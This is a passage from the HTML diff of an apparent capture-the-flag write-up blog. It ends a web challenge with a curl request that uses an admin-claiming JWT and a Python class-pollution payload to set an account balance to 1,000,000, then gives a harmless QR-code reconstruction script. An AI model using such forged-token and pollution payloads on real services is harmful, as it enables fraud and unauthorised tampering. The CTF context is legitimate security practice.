+  <span class="token parameter variable">-H</span> <span class="token string">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwidWlkIjoiMTQxMzkxNCIsImV4cCI6MTc3MjA3NTEwNH0.fck9rFNaNobg-GdL-XgIRWxSamSGBh4vM61Y6aaqg5s"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">-H</span> <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">-H</span> <span class="token string">"UID: 1413914"</span> <span class="token punctuation">\</span>
+  <span class="token parameter variable">-d</span> <span class="token string">'&#123;"__class__": &#123;"__init__": &#123;"__globals__": &#123;"balance": 1000000&#125;&#125;&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>刷新界面会发现我们的余额已经可以买flag了。</p>
+
+      
     </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
 </div>
 
-                    
-
-                    
-
-                    
-
-                    
-                    <div id="recommend-sections" class="recommend">
-                        
 
 
 
-                    </div>
-                    
-                </div>
-            </div>
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://dodor-ddd.github.io/2026/02/21/DODOR-000a01-WEEK2-WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/medias/qingxu.jpg">
+      <meta itemprop="name" content="DODOR">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | DODOR's BLOG">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/02/21/DODOR-000a01-WEEK2-WP/" class="post-title-link" itemprop="url">DODOR#000a01-WEEK2-WP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-02-21 16:52:01" itemprop="dateCreated datePublished" datetime="2026-02-21T16:52:01+08:00">2026-02-21</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-04-22 16:03:38" itemprop="dateModified" datetime="2026-04-22T16:03:38+08:00">2026-04-22</time>
+    </span>
+
+  
+</div>
+
         </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h2><h3 id="Invest-on-Matrix"><a href="#Invest-on-Matrix" class="headerlink" title="Invest on Matrix"></a><strong>Invest on Matrix</strong></h3><p>解锁hint1就知道是一个version2的二维码，剩下的就是不断解锁补全直到可以通过纠错识别出来，这是基础结构，我们优先补全右下角再逐渐保持中心完整，最后脚本如下：</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/f3d3572c11dfa9ec8a136d41608ce003918fa0ec6b6b" alt="img"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+<span class="token keyword">import</span> os
+
+<span class="token keyword">def</span> <span class="token function">make_matrix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    m <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">25</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">def</span> <span class="token function">place_finder</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                v <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token keyword">or</span> j <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">&lt;=</span>i<span class="token operator">&lt;=</span><span class="token number">4</span> <span class="token keyword">and</span> <span class="token number">2</span><span class="token operator">&lt;=</span>j<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">0</span>
+                m<span class="token punctuation">[</span>r<span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token operator">+</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v
+    place_finder<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+    place_finder<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span>
+    place_finder<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        m<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> j<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> i<span class="token operator">%</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span> <span class="token keyword">else</span> <span class="token number">0</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            r <span class="token operator">=</span> <span class="token number">16</span><span class="token operator">+</span>i
+            c <span class="token operator">=</span> <span class="token number">16</span><span class="token operator">+</span>j
+            v <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">or</span> j <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">2</span> <span class="token keyword">and</span> j<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">0</span>
+            m<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token operator">=</span> v
+    <span class="token keyword">return</span> m
+
+<span class="token keyword">def</span> <span class="token function">apply_block</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">,</span> vals<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> <span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">5</span>
+    c <span class="token operator">=</span> <span class="token punctuation">(</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">5</span>
+    sr <span class="token operator">=</span> r<span class="token operator">*</span><span class="token number">5</span>
+    sc <span class="token operator">=</span> c<span class="token operator">*</span><span class="token number">5</span>
+    <span class="token keyword">for</span> idx<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>vals<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        dr <span class="token operator">=</span> idx<span class="token operator">//</span><span class="token number">5</span>
+        dc <span class="token operator">=</span> idx<span class="token operator">%</span><span class="token number">5</span>
+        m<span class="token punctuation">[</span>sr<span class="token operator">+</span>dr<span class="token punctuation">]</span><span class="token punctuation">[</span>sc<span class="token operator">+</span>dc<span class="token punctuation">]</span> <span class="token operator">=</span> v
+
+<span class="token keyword">def</span> <span class="token function">save_png</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> path<span class="token punctuation">,</span> cell_size<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span> border<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
+    s <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">2</span><span class="token operator">*</span>border<span class="token punctuation">)</span> <span class="token operator">*</span> cell_size
+    img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'white'</span><span class="token punctuation">)</span>
+    px <span class="token operator">=</span> img<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            col <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">if</span> m<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span> <span class="token keyword">else</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span>
+            <span class="token keyword">for</span> dy <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cell_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">for</span> dx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>cell_size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                    px<span class="token punctuation">[</span><span class="token punctuation">(</span>x<span class="token operator">+</span>border<span class="token punctuation">)</span><span class="token operator">*</span>cell_size<span class="token operator">+</span>dx<span class="token punctuation">,</span> <span class="token punctuation">(</span>y<span class="token operator">+</span>border<span class="token punctuation">)</span><span class="token operator">*</span>cell_size<span class="token operator">+</span>dy<span class="token punctuation">]</span> <span class="token operator">=</span> col
+    img<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    m <span class="token operator">=</span> make_matrix<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    b2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b6 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b7 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b8 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b9 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b10 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b11 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b13 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b14 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b18 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b19 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
+    b15 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b20 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span>
+    b21 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token 